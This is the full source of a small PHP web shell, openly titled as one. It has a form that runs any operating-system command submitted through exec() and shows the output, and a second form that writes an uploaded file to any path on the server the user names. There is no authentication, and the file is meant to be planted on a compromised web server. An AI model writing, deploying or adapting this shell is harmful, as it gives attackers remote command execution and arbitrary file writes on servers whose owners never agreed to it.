<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html" charset="euc-kr">
		<title>PHP Web Shell Ver 0.01 by majorPE</title>
		<script type="text/javascript">
			function FocusIn(obj)
			{
				if(obj.value == obj.defaultValue)
					obj.value = '';
			}
			
			function FocusOut(obj)
			{
				if(obj.value == '')
					obj.value = obj.defaultValue;
			}
		</script>
	</head>
	<body>
		<b>WebShell's Location = http://<?php echo $_SERVER['HTTP_HOST']; echo $_SERVER['REQUEST_URI'] ?></b><br><br>
		
		HTTP_HOST = <?php echo $_SERVER['HTTP_HOST'] ?><br>
		REQUEST_URI = <?php echo $_SERVER['REQUEST_URI'] ?><br>
		
		<br>
		
		<form name="cmd_exec" method="post" action="http://<?php echo $_SERVER['HTTP_HOST']; echo $_SERVER['REQUEST_URI'] ?>">	
			<input type="text" name="cmd" size="70" maxlength="500" value="Input command to execute" onfocus="FocusIn(document.cmd_exec.cmd)" onblur="FocusOut(document.cmd_exec.cmd)">
			<input type="submit" name="exec" value="exec">
		</form>
		<?php
			if(isset($_POST['exec']))
			{
				exec($_POST['cmd'],$result);

				echo '----------------- < OutPut > -----------------';
				echo '<pre>';
				foreach($result as $print)
				{
					$print = str_replace('<','&lt;',$print);
					echo $print . '<br>';
				}
				echo '</pre>';
			}
			else echo '<br>';
		?>
		
		<form enctype="multipart/form-data" name="file_upload" method="post" action="http://<?php echo $_SERVER['HTTP_HOST']; echo $_SERVER['REQUEST_URI'] ?>">
			<input type="file" name="file">
			<input type="submit" name="upload" value="upload"><br>
			<input type="text" name="target" size="100" value="Location where file will be uploaded (include file name!)" onfocus="FocusIn(document.file_upload.target)" onblur="FocusOut(document.file_upload.target)">
		</form>
		<?php
			if(isset($_POST['upload']))
			{
				$check = move_uploaded_file($_FILES['file']['tmp_name'], $_POST['target']);
				
				if($check == TRUE)
					echo '<pre>The file was uploaded successfully!!</pre>';
				else
					echo '<pre>File Upload was failed...</pre>';
			}
		?>
	</body>
</html>
